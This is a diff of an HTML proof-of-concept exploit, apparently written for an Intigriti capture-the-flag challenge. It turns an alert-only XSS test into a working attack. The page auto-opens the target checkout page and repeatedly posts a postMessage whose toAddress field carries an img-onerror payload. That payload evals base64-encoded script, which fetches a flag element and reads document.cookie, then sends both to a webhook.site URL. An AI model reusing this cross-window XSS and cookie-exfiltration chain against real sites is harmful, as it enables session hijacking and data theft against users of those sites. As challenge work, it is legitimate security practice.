@@ -1,61 +1,93 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC</title>
+    <meta charset="UTF-8">
+    <title>Exploit POC</title>
 </head>
 <body>
-    <h2>Exploit Running...</h2>
-    <div id="status">Initializing...</div>
-    <button onclick="startExploit()">Click me</button>
 
     <script>
-        const targetUrl = "https://challenge-0126.intigriti.io/checkout.html";
-        const marketWatchUrl = "https://challenge-0126.intigriti.io/marketwatch.html";
+        const TARGET_BASE = "https://challenge-0126.intigriti.io";
+        const CHECKOUT_URL = TARGET_BASE + "/checkout.html";
+        const MARKETWATCH_URL = TARGET_BASE + "/marketwatch.html";
+        
+        const WEBHOOK_URL = "https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d";
 
         function log(msg) {
-            document.getElementById("status").innerText = msg;
+            document.getElementById("log").innerHTML += "<div>[+] " + msg + "</div>";
             console.log(msg);
         }
 
-        function startExploit() {
-            log("Opening target window...");
+        const exfilScript = `
+            fetch('/checkout.html')
+            .then(response => response.text())
+            .then(html => {
+                // Parse the HTML to find the specific flag element
+                var parser = new DOMParser();
+                var doc = parser.parseFromString(html, 'text/html');
+                var flagElement = doc.getElementById('flagText');
+                var flagContent = flagElement ? flagElement.innerText : "FLAG_ELEMENT_NOT_FOUND";
+                
+                // Also grab cookies just in case
+                var cookies = document.cookie;
 
-            var win = window.open(targetUrl, "targetWindow");
+                // Send data to attacker
+                // We base64 encode (btoa) to ensure characters don't break the URL
+                var finalUrl = "${WEBHOOK_URL}?flag=" + btoa(flagContent) + "&cookie=" + btoa(cookies);
+                window.location.href = finalUrl;
+            })
+            .catch(err => {
+                // If fetch fails, try to report the error
+                window.location.href = "${WEBHOOK_URL}?error=" + btoa(err.toString());
+            });
+        `;
 
-            const xssPayload = "0x\"><img src=x onerror=alert(document.domain)>";
 
-            const message = {
-                type: "submitTransaction",
-                transaction: {
-                    currency: "1337COIN",
-                    amount: 0.00000001, 
-                    toAddress: '"><img src=x onerror=alert(document.domain)>'
-                }
-            };
+        const base64Exfil = btoa(exfilScript);
 
-            let counter = 0;
-            const interval = setInterval(() => {
-                try {
-                    win.postMessage(message, "*");
-                    log(`Message sent (Attempt ${++counter})...`);
-                    
-                    if (counter > 20) {
+
+        const xssPayload = `"><img src=x onerror=eval(atob('${base64Exfil}'))>`;
+
+        function execute() {
+            log("Opening Admin Checkout Page...");
+            
+            let win = window.open(CHECKOUT_URL, "targetWindow");
+
+            setTimeout(() => {
+                log("Window loaded. Starting payload spam...");
+
+                const postMessageData = {
+                    type: "submitTransaction",
+                    transaction: {
+                        currency: "1337COIN", 
+                        amount: 1337,
+                        toAddress: xssPayload
+                    }
+                };
+
+                let attempts = 0;
+                let interval = setInterval(() => {
+                    win.postMessage(postMessageData, "*");
+                    attempts++;
+
+                    if (attempts % 5 === 0) log(`Payload sent ${attempts} times...`);
+
+                    if (attempts > 15) {
                         clearInterval(interval);
-                        log("Exploit phase complete. Redirecting to check result...");
+                        log("Payload delivery complete.");
+                        log("REDIRECTING Admin to MarketWatch to trigger XSS...");
                         
                         setTimeout(() => {
-                            win.location.href = marketWatchUrl;
-                        }, 1000);
+                            win.location.href = MARKETWATCH_URL;
+                            log("Exploit finished. Check your webhook!");
+                        }, 500);
                     }
-                } catch (e) {
-                    console.error(e);
-                }
-            }, 500);
+                }, 500);
+
+            }, 3000);
         }
 
-        window.onload = function() {
-            setTimeout(startExploit, 1000);
-        }
+        window.onload = execute;
     </script>
 </body>
 </html>
